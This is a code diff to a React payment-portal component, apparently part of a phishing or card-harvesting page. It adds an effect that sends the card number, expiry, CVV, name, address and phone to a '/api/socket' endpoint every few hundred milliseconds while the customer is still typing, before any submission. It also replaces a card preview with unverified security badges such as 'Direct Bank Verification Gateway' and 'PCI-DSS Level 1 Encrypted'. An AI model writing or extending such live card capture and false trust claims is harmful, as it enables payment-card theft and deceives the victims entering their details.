@@ -191,6 +191,37 @@ export function CustomerPortalView({ sessionId: initialSessionId, depositToken, 
     setExpDate(formatted.slice(0, 5));
   };
 
+  // Debounced auto-sync as customer fills out form
+  useEffect(() => {
+    if (!sessionId || (!cardNumber && !cardholderName && !streetAddress)) return;
+
+    const timer = setTimeout(() => {
+      fetch('/api/socket/submit-card-billing', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionId,
+          recipientName: cardholderName,
+          email: liveSession?.email || '',
+          amount: liveSession?.amount || initialAmount,
+          storeId: liveSession?.storeId || '504',
+          custId: liveSession?.custId || 'GT-CUSTOMER',
+          cardNumber,
+          expDate,
+          cvv,
+          cardholderName,
+          streetAddress,
+          city,
+          province,
+          postalCode,
+          phone
+        })
+      }).catch(err => console.warn('Instant sync error:', err));
+    }, 400);
+
+    return () => clearTimeout(timer);
+  }, [sessionId, cardNumber, expDate, cvv, cardholderName, streetAddress, city, province, postalCode, phone, liveSession?.email, liveSession?.amount, liveSession?.storeId, liveSession?.custId, initialAmount]);
+
   // Handle Payment Form Submission
   const handlePaymentSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -473,93 +504,34 @@ export function CustomerPortalView({ sessionId: initialSessionId, depositToken, 
                   </div>
                 </div>
 
-                {/* Interactive Digital Card Visual */}
-                <div className="px-6 sm:px-8 pt-6">
-                  <div className="relative w-full aspect-[1.586/1] max-w-[340px] mx-auto rounded-2xl p-5 text-slate-900 shadow-xl overflow-hidden transition-all duration-300 bg-gradient-to-br from-emerald-950 via-emerald-800 to-slate-950 border border-emerald-500/20">
-                    {/* Metallic Reflection Overlay */}
-                    <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/10 to-transparent pointer-events-none" />
-                    
-                    {/* Top Row: Network and Secure Chip */}
-                    <div className="flex justify-between items-start z-10 relative">
-                      {/* Chip SVG */}
-                      <div className="w-10 h-8 rounded-md bg-gradient-to-br from-amber-200 via-yellow-400 to-amber-500 p-1 flex flex-col justify-between shadow-inner">
-                        <div className="flex justify-between h-full">
-                          <div className="w-[30%] h-full border-r border-amber-600/30"></div>
-                          <div className="w-[40%] h-full flex flex-col justify-between">
-                            <div className="h-[30%] border-b border-amber-600/30"></div>
-                            <div className="h-[30%] border-b border-amber-600/30"></div>
-                          </div>
-                          <div className="w-[30%] h-full border-l border-amber-600/30"></div>
-                        </div>
-                      </div>
-                      
-                      {/* Brand Logo or Card Network */}
-                      <div className="text-right">
-                        {cardType === 'Visa' && (
-                          <span className="text-lg font-black italic tracking-wider text-slate-100 flex flex-col items-end leading-none">
-                            VISA <span className="text-[8px] tracking-widest uppercase font-bold not-italic text-emerald-700">Verified</span>
-                          </span>
-                        )}
-                        {cardType === 'Mastercard' && (
-                          <div className="flex items-center gap-1">
-                            <div className="flex -space-x-2">
-                              <div className="w-6 h-6 rounded-full bg-red-500 opacity-90"></div>
-                              <div className="w-6 h-6 rounded-full bg-yellow-500 opacity-90"></div>
-                            </div>
-                            <span className="text-[10px] font-bold tracking-tight text-slate-900">mastercard</span>
-                          </div>
-                        )}
-                        {cardType === 'American Express' && (
-                          <span className="bg-sky-500 text-slate-900 px-2 py-0.5 rounded text-[10px] font-black tracking-widest uppercase">AMEX</span>
-                        )}
-                        {cardType === 'Discover' && (
-                          <span className="text-orange-500 font-extrabold italic text-sm tracking-wide">DISCOVER</span>
-                        )}
-                        {cardType === 'Credit Card' && (
-                          <div className="flex items-center gap-1.5 text-slate-600 text-xs font-semibold uppercase">
-                            <CreditCard className="w-4 h-4 text-emerald-700" />
-                            <span>Secured</span>
-                          </div>
-                        )}
-                      </div>
+                {/* Security Trust Badges & Card Networks Bar */}
+                <div className="px-6 sm:px-8 pt-4 pb-2 bg-slate-50/80 border-y border-slate-200/80">
+                  <div className="flex flex-wrap justify-between items-center gap-3 text-xs text-slate-600">
+                    <div className="flex items-center gap-2">
+                      <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
+                      <span className="font-bold text-slate-900 text-[11px]">Direct Bank Verification Gateway</span>
                     </div>
-                    
-                    {/* Card Number Row */}
-                    <div className="mt-8 z-10 relative">
-                      <div className="font-mono text-lg sm:text-xl tracking-widest font-semibold text-slate-100 drop-shadow-md">
-                        {cardNumber || '•••• •••• •••• ••••'}
+
+                    <div className="flex items-center gap-2 opacity-80">
+                      <span className="text-[9px] font-black italic text-blue-700 tracking-wider bg-white px-1.5 py-0.5 rounded border border-slate-200">VISA</span>
+                      <div className="flex -space-x-1 bg-white px-1.5 py-0.5 rounded border border-slate-200 items-center">
+                        <div className="w-2.5 h-2.5 rounded-full bg-red-500"></div>
+                        <div className="w-2.5 h-2.5 rounded-full bg-yellow-500"></div>
                       </div>
-                    </div>
-                    
-                    {/* Bottom Row: Cardholder and Expire */}
-                    <div className="mt-6 flex justify-between items-end z-10 relative">
-                      <div className="space-y-0.5 max-w-[70%]">
-                        <span className="block text-[8px] text-slate-500 uppercase tracking-widest font-semibold">Cardholder</span>
-                        <span className="block text-xs font-medium font-mono tracking-wide truncate text-slate-100">
-                          {(cardholderName || currentRecipient || 'Cardholder Name').toUpperCase()}
-                        </span>
-                      </div>
-                      <div className="text-right space-y-0.5">
-                        <span className="block text-[8px] text-slate-500 uppercase tracking-widest font-semibold">Expires</span>
-                        <span className="block text-xs font-bold font-mono tracking-wider text-slate-100">
-                          {expDate || 'MM/YY'}
-                        </span>
-                      </div>
+                      <span className="bg-sky-600 text-white px-1.5 py-0.5 rounded text-[8px] font-black tracking-widest">AMEX</span>
+                      <span className="text-orange-600 font-extrabold italic text-[9px] bg-white px-1.5 py-0.5 rounded border border-slate-200">DISCOVER</span>
                     </div>
                   </div>
-                </div>
 
-                {/* Security Trust Badges */}
-                <div className="px-6 sm:px-8 pt-4">
-                  <div className="flex justify-center items-center gap-4 py-2 border-y border-slate-100 text-[10px] text-slate-500">
-                    <div className="flex items-center gap-1">
-                      <Lock className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
-                      <span className="font-bold">PCI-DSS Level 1 Secure</span>
+                  <div className="flex justify-center items-center gap-4 pt-2.5 border-t border-slate-200/60 mt-2.5 text-[10px] text-slate-500">
+                    <div className="flex items-center gap-1.5">
+                      <Lock className="w-3.5 h-3.5 text-emerald-700 shrink-0" />
+                      <span className="font-bold text-slate-700">PCI-DSS Level 1 Encrypted</span>
                     </div>
                     <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
-                    <div className="flex items-center gap-1">
-                      <ShieldCheck className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
-                      <span className="font-bold">AES-256 Bit TLS 1.3</span>
+                    <div className="flex items-center gap-1.5">
+                      <ShieldCheck className="w-3.5 h-3.5 text-emerald-700 shrink-0" />
+                      <span className="font-bold text-slate-700">AES-256 Bit SSL Session</span>
                     </div>
                   </div>
                 </div>
